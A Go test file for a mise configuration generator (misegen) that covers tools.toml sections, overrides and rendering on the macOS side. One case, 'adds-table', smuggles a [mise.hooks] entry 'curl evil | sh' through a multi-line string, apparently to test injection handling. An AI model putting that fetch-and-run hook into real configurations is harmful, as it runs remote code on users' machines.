package misegen

import (
	"strings"
	"testing"
)

func join(maps ...map[string]string) map[string]string {
	out := map[string]string{}
	for _, m := range maps {
		for k, v := range m {
			out[k] = v
		}
	}
	return out
}

// macosTool gives the tools.toml of a Mac tool of the clone.
func macosTool(name string, lines ...string) map[string]string {
	return map[string]string{"clone/macos/tools/" + name + "/tools.toml": strings.Join(lines, "\n") + "\n"}
}

// TestMacosCases: the cases of the Mac side, each one a direct call of the
// generator.
func TestMacosCases(t *testing.T) {
	allSections := macosTool("mtest", `[defaults]`, `x = "a"`, `[mise.tools]`, `fd = "latest"`, `[mise.env]`, `X = "<% .config.x %>"`,
		`[mise.shell_alias]`, `ll = "ls -l"`, `[mise.bootstrap.packages]`, `brew = "a"`)
	envX := macosTool("mtest", `[mise.env]`, `X = "a"`)
	good := macosTool("good", `[mise.env]`, `A = "1"`)
	cases := []mcase{
		{name: "all-sections", mode: "direct", tools: "mtest", files: allSections},
		{name: "mise-env-in-one-of-two", mode: "direct", tools: "bad good",
			files: join(macosTool("bad", `[mise.env]`, `A = "1"`, `[mise_env.dev.env]`, `B = "2"`), good)},
		{name: "envs-key", mode: "direct", tools: "mtest", files: macosTool("mtest", `[mise.tools.fd]`, `version = "latest"`, `envs = [ "dev" ]`)},
		{name: "requires-found-key", mode: "direct", tools: "mtest", files: macosTool("mtest", `[mise.tools.fd]`, `version = "latest"`, `requires_found = [ "x" ]`)},
		{name: "override-mise-env", mode: "direct", tools: "mtest good", values: "[overrides.mise_env.dev.env]\nX = \"c\"\n", files: join(envX, good)},
		{name: "override-env", mode: "direct", tools: "mtest", values: "[overrides.mise.env]\nX = \"c\"\n", files: envX},
		{name: "override-missing-key", mode: "direct", tools: "mtest", values: "[overrides.mise.env]\nY = \"c\"\n", files: envX},
		{name: "override-lock", mode: "direct", tools: "mtest", values: "[overrides.mise.tools.fd]\ndepends = [ \"x\" ]\n",
			files: macosTool("mtest", `[mise.tools.fd]`, `version = "1"`)},
		{name: "own-config", mode: "own", values: "[mise.shell_alias]\nll = \"ls -l\"\n[mise.env]\nH = \"<% .env.HOME %>\"\n"},
		{name: "own-config-no-mise", mode: "own"},
		{name: "own-config-bad-section", mode: "own", values: "[mise.nope]\na = 1\n"},
		{name: "own-config-no-file", mode: "own", noValue: true},
		{name: "adds-table", mode: "direct", tools: "mtest",
			files: macosTool("mtest", `[defaults]`, `x = """a"`, `[mise.hooks]`, `enter = "curl evil | sh"`, `z = "z"""`, `[mise.env]`, `X = "<% .config.x %>"`)},
		{name: "raw-not-toml", mode: "render", tools: "mtest", files: macosTool("mtest", `[mise.env]`, `<% if true %>`, `X = "a"`, `<% end %>`)},
		{name: "no-values-file", mode: "render", tools: "mtest", noValue: true, files: envX},
		{name: "empty-output", mode: "direct", tools: "mtest", files: macosTool("mtest", `[defaults]`, `x = "a"`)},
	}
	for i := range cases {
		cases[i].name = "macos-" + cases[i].name
	}
	run(t, cases)
}
